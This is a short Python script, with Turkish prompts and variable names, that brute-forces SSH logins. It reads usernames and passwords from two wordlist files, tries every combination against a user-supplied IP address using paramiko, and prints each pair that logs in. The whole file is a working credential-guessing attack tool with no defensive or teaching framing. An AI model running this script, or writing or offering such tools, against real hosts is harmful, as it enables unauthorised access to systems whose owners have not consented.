import paramiko
#client = paramiko.SSHClient()
#client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
dosya = open("username.txt","r")
username_dosya = dosya.read()
dosya.close()
dosya = open("password.txt","r")
password_dosya = dosya.read()
dosya.close()
IP = input("IP adresi:")
for user in username_dosya.split("\n"):
	for passwd in password_dosya.split("\n"):
		try:
			#print(str(user), " - ",str(passwd))
			client = paramiko.SSHClient()
			client.load_system_host_keys()
			client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

			client.connect(str(IP),username=user,password=passwd,banner_timeout=20)
			#print(sonuc)
			client.close()
			print("[22][ssh] host:",str(IP),"  login:",user,"  password: ",passwd) 
		except:
			pass
